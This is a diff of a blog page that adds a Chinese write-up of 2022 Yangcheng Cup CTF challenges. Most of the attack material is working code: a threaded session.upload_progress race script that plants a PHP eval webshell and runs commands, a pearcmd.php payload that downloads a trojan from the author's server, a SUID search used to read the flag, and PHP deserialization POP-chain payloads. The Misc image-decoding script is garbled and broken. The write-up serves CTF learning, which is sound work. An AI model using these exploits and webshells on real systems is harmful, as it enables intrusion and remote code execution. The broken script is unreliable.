@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>Categories | wh1t3zer</title>
+  <title>2022羊城杯部分题目wp | wh1t3zer</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -505,131 +505,508 @@
 </header>
         <!-- 内容区域 -->
         
-<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"></div>
-<div class="bg-light-floor-categories" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -3;"></div>
+ <!-- prismjs 代码高亮 -->
+ 
 
-<div class="categories-header" style="background-image:url('https://pic2.zhimg.com/80/v2-7c496c95897fb15768593cc5170c8b1a_1440w.jpg?source=1940ef5c')">
-    <div class="categories-header-title">
-        categories
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('/medias/8.jpg')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        2022羊城杯部分题目wp
+      </span>
     </div>
-    <div class="categories-header-desc">
     
-        <span class="title" id="categories-header-desc"></span>
-    <script>
-  function typedFn() {
-    const el = '#categories-header-desc';
-    const type = 'categories';
-    let desc = '愿你如风，被人温柔以待'
-    var typed = new Typed(el, {
-      strings: [desc],
-      startDelay: 100,
-      typeSpeed: 100,
-      loop: true,
-      backSpeed: 50,
-      showCursor: true
-    });
-  }
-  typedFn();
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> Published in：2022-09-06 |
+        </span>
+      
+
+      
+        <span class="post-detail-header_categories">
+          <i class="iconfont iconbookmark1"></i> category：
+          
+            <a href="/categories/ctf/" class="post-detail-header_category">
+              ctf
+            </a>
+          
+        </span>
+      
+
+      
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="row justify-position" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h2 id="0x00Web1"><a href="#0x00Web1" class="headerlink" title="0x00Web1"></a>0x00Web1</h2><p>通过session.upload_progress进行命令执行</p>
+<p>上一个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://80.endpoint-64526833dfe7456cb9e962705979da2d.dasc.buuoj.cn:81/&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;111&quot;</span></span><br><span class="line"></span><br><span class="line">proxy = <span class="string">&#x27;127.0.0.1:9090&#x27;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line"></span><br><span class="line">  <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://&#x27;</span> + proxy,</span><br><span class="line"></span><br><span class="line">  <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://&#x27;</span> + proxy</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">  filebytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res = session.post(url,</span><br><span class="line">      data=&#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">      cookies=&#123;</span><br><span class="line">        <span class="string">&#x27;PHPSESSID&#x27;</span>: sessid</span><br><span class="line">        &#125;,</span><br><span class="line">      files=&#123;</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;21r000.jpg&#x27;</span>, filebytes)</span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line">    \<span class="comment">#print(res.text)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res = session.post(url+<span class="string">&quot;?file=/tmp/sess&quot;</span>+<span class="string">&quot;%5f&quot;</span>+sessid,</span><br><span class="line">              data=&#123;</span><br><span class="line">                <span class="string">&quot;1&quot;</span>:<span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span></span><br><span class="line">              &#125;,</span><br><span class="line">              cookies=&#123;</span><br><span class="line">                <span class="string">&quot;PHPSESSID&quot;</span>:sessid</span><br><span class="line">              &#125;,proxies=proxies</span><br><span class="line">              )</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  evnet = threading.Event()</span><br><span class="line">  <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">      threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">      threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">  evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+<p>由题目可以看到下划线_被过滤了，使用URL编码，将它改成%5f，通过python脚本转到bp</p>
+<p>发现查看flag权限不够，考虑到php系统有一个pearcmd.php，这个页面可以通过下载命令从任意服务器下载任意文件，而且这个页面存在的路径在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php</p>
+<p>构造payload ?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;+download+<a target="_blank" rel="noopener" href="http://ip:46000/a.php%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%9C%A8%E9%A9%AC">http://ip:46000/a.php，下载木马</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>密码是1，蚁剑连上，查看文件</p>
+<p><img src="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/wps1.jpg" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/wps1.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="img"> </p>
+<p>查看下拥有s权限位的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/image-20220906191948128.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/image-20220906191948128.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220906191948128"></p>
+<p>发现有date命令，date命令可以输出字符，尝试下date -f flag</p>
+<p><img src="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/wps4.jpg" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/wps4.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="img"> </p>
+<h2 id="0x01Web2"><a href="#0x01Web2" class="headerlink" title="0x01Web2"></a>0x01Web2</h2><p>反序列化题，审一下代码</p>
+<p>由cheng的<code>__wakeup()</code>方法开始，cheng-&gt;c1为bei类即可进入到bei的 <code>__set()</code>方法，bei-&gt;b1为yang类，即可进入yang的<code>__tostring()</code>，y1为phpinfo，即可查看phpinfo</p>
+<p>构造payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ans=O:<span class="number">5</span>:<span class="string">&quot;cheng&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;c1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;bei&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;b1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;yang&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;y1&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;phpinfo&quot;</span>;&#125;s:<span class="number">2</span>:<span class="string">&quot;b2&quot;</span>;N;&#125;&#125;</span><br><span class="line">拿到flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/wps5.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/wps5.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="img"> </p>
+<h2 id="0x02Web6"><a href="#0x02Web6" class="headerlink" title="0x02Web6"></a>0x02Web6</h2><p>还是一道反序列化题，老方法，审计代码</p>
+<p>pop&#x3D;a:1:{i:0;O:1:”B”:2:{s:1:”p”;s:13:”Test::getFlag”;s:1:”a”;O:1:”A”:1:{s:1:”a”;O:3:”Fun”:1:{s:9:”Funfunc”;s:20:”call_user_func_array”;}}}}</p>
+<p>有classB入手<code>__destruct()</code>，$this-&gt;a为classA进入A类的<code>__get()</code>方法，p作为参数传入，$this-&gt;a为Fun类，指向不存在的方法Test::getFlag()，进入classFun的<code>__call()</code>方法，通过<code>call_user_func_array</code>方法执行了Test类的getFlag()方法，得到flag</p>
+<p><img src="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/wps6.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/wps6.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="img"> </p>
+<h2 id="0x03Misc1"><a href="#0x03Misc1" class="headerlink" title="0x03Misc1"></a>0x03Misc1</h2><p>Vig.txt内容通过维吉尼亚密码解码之后得到一段英文，翻译之后获得解压密码，将bmp图片内容通过脚本转回文字</p>
+<p><img src="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/image-20220906193619128.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/image-20220906193619128.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220906193619128"></p>
+<p>祭出脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">image</span>):</span><br><span class="line">  \<span class="comment">#得到图片的大小</span></span><br><span class="line">  width, height = image.size</span><br><span class="line">  ls = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">      \<span class="comment">#获得每个位置上的rgb值</span></span><br><span class="line">      r, g, b = image.getpixel((j, i))</span><br><span class="line">     \<span class="comment">#获得每个像素对应的汉字字符</span></span><br><span class="line">     word_number = r + (g &lt;&lt; <span class="number">8</span>) + b</span><br><span class="line">     word_string = <span class="built_in">chr</span>(word_number)</span><br><span class="line">  ppend(word_string)</span><br><span class="line">  \<span class="comment">#将列表合成为字符创</span></span><br><span class="line">  text_result = <span class="string">&quot;&quot;</span>.join(ls)</span><br><span class="line">  <span class="keyword">return</span> text_result</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">  \<span class="comment">#打开图片</span></span><br><span class="line">  image = Image.<span class="built_in">open</span>(<span class="string">&quot;out.bmp&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">  text = decode(image)</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding = <span class="string">&quot;gbk&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(text)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+<p>得到文本文件，将文本文件中夹杂的flag提取出来</p>
+<p><img src="C:/Users/60246/AppData/Local/Temp/ksohtml20000/wps7.jpg" class="lazyload placeholder" data-srcset="C:/Users/60246/AppData/Local/Temp/ksohtml20000/wps7.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="img"> </p>
+<h2 id="0x04签到题"><a href="#0x04签到题" class="headerlink" title="0x04签到题"></a>0x04签到题</h2><p>转Rot13转base32</p>
+<p><img src="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/wps8.jpg" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/wps8.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="img"> </p>
+<p><img src="C:/Users/60246/AppData/Local/Temp/ksohtml20000/wps9.jpg" class="lazyload placeholder" data-srcset="C:/Users/60246/AppData/Local/Temp/ksohtml20000/wps9.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="img"> </p>
+
+      </div>
+      <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/ctf/" class="">
+              ctf
+            </a>
+          
+        </div>
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>author:  </strong>wh1t3zer</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>link:  </strong>
+    <a href="/2022/09/06/2022羊城杯WP/" target="_blank" title="2022羊城杯部分题目wp">https://wh1t3zer.github.io/2022/09/06/2022羊城杯WP/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>Copyright notice:   </strong>
+      All articles on this website, unless otherwise stated, adopt <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      reprint policy. If reproduced, please indicate source!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="/medias/5.jpg" class="lazyload placeholder" data-srcset="/medias/5.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
+    </div>
+    <a href="/2022/08/25/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%9F%A5%E8%AF%86/" class="post-nav-link">
+      <div class="title">
+        Next: <i class="fas fa-angle-right"></i>
+        <div class="title-text">浅谈逆向入门有关的知识</div>
+      </div>
+      <!-- <div class="content">
+        最近在学逆向入门，然后打算开一篇文章记录下一些逆向的笔记，错误之处，请指出。
+0x00逆向的解释逆向的本质就是将一个程序
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+      <div id="appDonate" class="post-donate">
+  <div id="donate_board" class="donate_bar center" ref="donate">
+    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
+  </div>
+  <transition name="fade">
+    <div 
+      class="donate-box-mask"
+      v-cloak 
+      v-show="visible"
+      @click="cancelDialogDrawer()"
+    >
+    </div>
+  </transition>
+  <transition name="bounce">
+    <div class="donate-box" v-cloak v-show="visible">
+      <div class="donate-box_close">
+        <i class="fas fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
+      </div>
+      <div class="donate-box_title">
+        <h4>
+          你的赏识是我前进的动力
+        </h4>
+      </div>
+      <div class="donate-box_tab">
+        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
+          支付宝
+        </div>
+        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
+          微信
+        </div>
+      </div>
+      <div class="donate-box_img">
+        <div class="AlipayImg" v-show="tabActive === 'Alipay'">
+          <img src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="支付宝打赏" />
+        </div> 
+        <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
+          <img src="/medias/2.jpg" class="lazyload placeholder" data-srcset="/medias/2.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="微信打赏" />
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDonate',
+    data: {
+      visible: false,
+      tabActive: 'Alipay',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        // function getScroll() {
+        //   return {
+        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
+        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
+        //   };
+        // }
+        this.top = $(document).scrollTop() // or getScroll().top
+        // console.log('aa', $('.main-content'));
+        body.style.cssText = 'overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+      changeTabActive(name) {
+        this.tabActive = name;
+      }
+    },
+    created() {}
+  })
 </script>
     
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      <div id="gitment-container"></div>
+
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <!-- 文章详情页右侧目录 -->
+
+  <div class="toc-aside">
+    <div class="toc-main">
+      <div class="toc-aside-title">
+        <i class="fas fa-list-ul" aria-hidden="true"></i><span>catalog</span>
+        
+          <div class="toc-open-close">catalog</div>
+        
+      </div>
+      <div class="toc-content">
+        <div class="toc"></div>
+      </div>
     </div>
-    <div class="mask-box"></div>
+  </div>
+
+  <!-- 手机端目录按钮 -->
+  <div id="toc-mobile-btn">
+    <i class="fas fa-list-ul" aria-hidden="true"></i>
+  </div>
+
+
+<script>
+  function closeToc(init) {
+    $(".toc-aside").css({'width': 0, 'padding': 0, 'transition': init ?  'noe' : 'width 0.3s' });
+    $(".toc-content").css({'width': 0});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
+    $(".main-content").css({'width': '75%', 'margin': '10px auto'});
+  };
+  function openToc() {
+    $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
+    $(".toc-aside").css({'width': '300px', 'padding': '0 10px', 'transition': 'width 0.3s'});
+    $(".toc-content").css({'width': '300px'});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
+  }
+  function openBtnClickFn () {
+    let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
+    let open = eval('' || 'true');
+    openOrCloseBtn.click(function() {
+      if (open) {
+        closeToc();
+        open = false;
+      } else {
+        openToc();
+        open = true;
+      }
+    });
+  };
+  openBtnClickFn();
+  initCloseTocWidth(true);
+
+  function initCloseTocWidth(init) {
+    if (window.innerWidth >= 992) {
+      let isClose = false;
+      isClose && closeToc(init)
+    }
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    $(".toc-aside").css({'transition': 'no'});
+  })
+  document.addEventListener('pjax:complete', function () {
+    openBtnClickFn();
+  })
+  
+</script>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
 </div>
 
-
-
-<div id="categories" class="container">
-    <div class="card">
-        <div class="card-content">
-            <div class="category-title center-align">
-                <i class="fas fa-tags"></i>&nbsp;&nbsp;Article Categories
-            </div>
-            <div class="category-chips">
-                
-                
-                <a href="/categories/CTF-SQL%E6%B3%A8%E5%85%A5/" title="CTF | SQL注入: 1">
-                    <span class="category-content"
-                        title="CTF | SQL注入" style="background-color: #F8F9F9;">CTF | SQL注入
-                        <span class="category-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/CTF-XSS%E6%B3%A8%E5%85%A5/" title="CTF | XSS注入: 1">
-                    <span class="category-content"
-                        title="CTF | XSS注入" style="background-color: #FEF9E7;">CTF | XSS注入
-                        <span class="category-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/java-%E6%9C%9F%E6%9C%AB/" title="java | 期末: 1">
-                    <span class="category-content"
-                        title="java | 期末" style="background-color: #F9E79F;">java | 期末
-                        <span class="category-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/%E9%BB%98%E8%AE%A4%E5%88%86%E7%B1%BB-CTF-XSS%E6%B3%A8%E5%85%A5/" title="默认分类 | CTF | XSS注入: 1">
-                    <span class="category-content"
-                        title="默认分类 | CTF | XSS注入" style="background-color: #85C1E9;">默认分类 | CTF | XSS注入
-                        <span class="category-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/webshell-CTF/" title="webshell | CTF: 1">
-                    <span class="category-content"
-                        title="webshell | CTF" style="background-color: #D5F5E3;">webshell | CTF
-                        <span class="category-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/CTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="CTF | 文件上传: 2">
-                    <span class="category-content"
-                        title="CTF | 文件上传" style="background-color: #D5F5E3;">CTF | 文件上传
-                        <span class="category-length">2</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/CTF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="CTF | 反序列化: 1">
-                    <span class="category-content"
-                        title="CTF | 反序列化" style="background-color: #F5EEF8;">CTF | 反序列化
-                        <span class="category-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/java-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AE%97%E6%B3%95/" title="java | 服务器算法: 1">
-                    <span class="category-content"
-                        title="java | 服务器算法" style="background-color: #F5EEF8;">java | 服务器算法
-                        <span class="category-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/%E9%BB%98%E8%AE%A4%E5%88%86%E7%B1%BB-CTF-reverse/" title="默认分类 | CTF | reverse: 1">
-                    <span class="category-content"
-                        title="默认分类 | CTF | reverse" style="background-color: #E8F8F5;">默认分类 | CTF | reverse
-                        <span class="category-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/ctf/" title="ctf: 1">
-                    <span class="category-content"
-                        title="ctf" style="background-color: #F9E79F;">ctf
-                        <span class="category-length">1</span>
-                    </span>
-                </a>
-                
-            </div>
-        </div>
-    </div>
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
 </div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
